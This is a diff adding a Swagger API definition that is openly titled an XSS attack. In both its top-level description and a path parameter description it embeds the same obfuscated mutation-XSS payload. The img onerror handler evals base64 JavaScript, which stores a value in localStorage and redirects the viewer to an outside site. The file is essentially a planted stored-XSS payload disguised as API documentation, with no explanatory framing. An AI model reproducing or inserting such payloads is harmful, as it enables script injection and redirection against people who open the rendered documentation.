@@ -1,0 +1,38 @@
+swagger: '2.0'
+info:
+  title: XSS Attack BY M0X0101
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='dHJ5IHsgY29uc3QgdGVyVmFsdWUgPSBnZXQwcmFtcFZhbHVlKCdzZXJ2aWNlVGVyJyk7IGlmICh0ZXJWYWx1ZSkgeyBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgndGVyVmFsdWUnLCB0ZXJWYWx1ZSk7IHdpbmRvdy5sb2NhdGlvbi5ocmVmID0gJ2h0dHBzOi8vaHVudGVyZnVsbC5vbmxpbmUnOyB9IGVsc2UgeyBjb25zb2xlLmVycm9yKCdUZXIga2jDqm5nIG7hu5lpIGJp4buHdSB0cm9uZyBMb2NhbFN0b3JhZ2UuJyk7IH0gfSBjYXRjaCAoZXJyKSB7IGNvbnNvbGUuZXJyb3IoJ0NvdWxkIG5vdCBleGVjdXRlIGVuY29kZWQgY29tbWFuZCc7IH0=' onerror='eval(atob(this.id))'>"></form>
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /M0X0101:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - M0X0101_XSS_D
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/hack/hachid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='dHJ5IHsgY29uc3QgdGVyVmFsdWUgPSBnZXQwcmFtcFZhbHVlKCdzZXJ2aWNlVGVyJyk7IGlmICh0ZXJWYWx1ZSkgeyBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgndGVyVmFsdWUnLCB0ZXJWYWx1ZSk7IHdpbmRvdy5sb2NhdGlvbi5ocmVmID0gJ2h0dHBzOi8vaHVudGVyZnVsbC5vbmxpbmUnOyB9IGVsc2UgeyBjb25zb2xlLmVycm9yKCdUZXIga2jDqm5nIG7hu5lpIGJp4buHdSB0cm9uZyBMb2NhbFN0b3JhZ2UuJyk7IH0gfSBjYXRjaCAoZXJyKSB7IGNvbnNvbGUuZXJyb3IoJ0NvdWxkIG5vdCBleGVjdXRlIGVuY29kZWQgY29tbWFuZCc7IH0=' onerror='eval(atob(this.id))'>"></form>
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
